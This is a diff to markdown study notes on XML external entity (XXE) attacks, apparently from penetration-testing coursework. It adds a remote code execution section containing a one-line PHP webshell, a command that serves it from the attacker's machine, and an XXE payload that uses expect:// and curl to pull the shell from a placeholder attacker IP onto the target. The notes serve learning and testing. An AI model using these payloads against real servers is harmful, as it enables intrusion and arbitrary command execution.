@@ -412,7 +412,7 @@ Since we know we can define new entities, let's see if we can point those at the
 ![web_attacks_xxe_external_entity](images/web_attacks_xxe_external_entity.jpg)
 *The response showing that we were able to access /etc/passwd*
 
-- Now we have local file disclose, and we can use that to get the source code of the web app, or other valuable info.
+- Now we have local file disclosure, and we can use that to get the source code of the web app, or other valuable info.
 
 ### Reading Source Code
 We can't use the above method for source code because some special characters may be included that are not allowed in XML, such as `<`/`>`/`&`.
@@ -426,8 +426,30 @@ PHP in particular provides a wrapper that allows us to base64 encode certain res
 ]>
 ```
 *using base64 php filter to exfiltrate source code*
+> Note: This only works with PHP  
 
 ### Remote Code Execution
+- Easiest Methods for RCE would be forcing a call back from a windows server (Responder) or locating ssh keys.
+- If PHP `expect` module is installed, we may be able to use the `PHP://expect` filter
+    - `expect` must be installed
+    - We must get output back on the screen, such as the example above.
+    - Limited to relatively simple commands that won't break XML
+
+- One of the easiest methods would be to upload a webshell hosted on our attack host, and have the `expect` method upload it for us.
+```bash
+echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+sudo python3 -m http.server 80
+```
+- Now we can use the following XML to upload it to the server
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE email [
+    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+```
+> Note: We replaced all of the spaces with `$IFS` to avoid breaking the XML.
+
+> Note: The expect module is not enabled/installed by default on modern PHP server5s.
 
 ## Advanced File Disclosure
 ## Blind Data Exfiltration
